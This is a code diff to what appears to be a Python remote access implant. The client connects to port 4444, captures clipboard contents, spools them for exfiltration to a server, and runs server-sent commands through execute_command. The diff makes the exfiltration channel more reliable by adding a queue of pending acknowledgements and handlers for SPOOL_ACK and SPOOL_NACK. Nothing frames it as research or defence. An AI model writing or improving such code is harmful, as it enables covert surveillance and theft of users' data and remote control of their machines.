@@ -13,6 +13,7 @@ import logging
 import io
 import base64
 import threading
+import queue
 
 SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 4444
@@ -163,23 +164,28 @@ def _clipboard_flush_thread(clipboard_monitor, spool, stop_event):
             spool.push("clipboard", {"data": latest, "time": time.strftime("%Y-%m-%dT%H:%M:%S")})
 
 
-def _spool_sender_thread(sock, key, spool, stop_event, send_lock, interval=5):
-    """Drains spool to server. Retries every `interval` seconds."""
+def _spool_sender_thread(sock, key, spool, stop_event, send_lock, pending_acks, interval=5):
+    """Drains spool to server. ACKs are processed by the main command loop."""
     while not stop_event.is_set():
         for item in spool.pending():
             if stop_event.is_set():
                 break
+            # Skip items already pending ACK
+            try:
+                if item["id"] in pending_acks.queue:
+                    continue
+            except Exception:
+                pass
             try:
                 payload = json.dumps({
                     "kind": item["kind"],
                     "ts": item["ts"],
-                    "payload": item["payload"]
+                    "payload": item["payload"],
+                    "spool_id": item["id"]
                 })
                 with send_lock:
                     send_msg(sock, f"spool_data {payload}", key)
-                ack = recv_msg(sock, key)
-                if ack == b"SPOOL_ACK":
-                    spool.ack(item["id"])
+                pending_acks.put(item["id"])
             except Exception:
                 break  # connection lost — spool stays on disk
         stop_event.wait(interval)
@@ -525,9 +531,10 @@ def main():
                     args=(clipboard_monitor, _spool, exfil_stop),
                     daemon=True
                 ).start()
+                pending_spool_acks = queue.Queue()
                 threading.Thread(
                     target=_spool_sender_thread,
-                    args=(client, key, _spool, exfil_stop, send_lock),
+                    args=(client, key, _spool, exfil_stop, send_lock, pending_spool_acks),
                     daemon=True
                 ).start()
                 threading.Thread(
@@ -749,6 +756,21 @@ def main():
                     client.close()
                     logger.info("Exit received")
                     sys.exit(0)
+
+                elif command == "SPOOL_ACK":
+                    if SPOOL_AVAILABLE:
+                        try:
+                            item_id = pending_spool_acks.get_nowait()
+                            _spool.ack(item_id)
+                        except Exception:
+                            pass
+
+                elif command == "SPOOL_NACK":
+                    if SPOOL_AVAILABLE:
+                        try:
+                            pending_spool_acks.get_nowait()  # discard, item stays in spool for retry
+                        except Exception:
+                            pass
 
                 else:
                     response = execute_command(command)
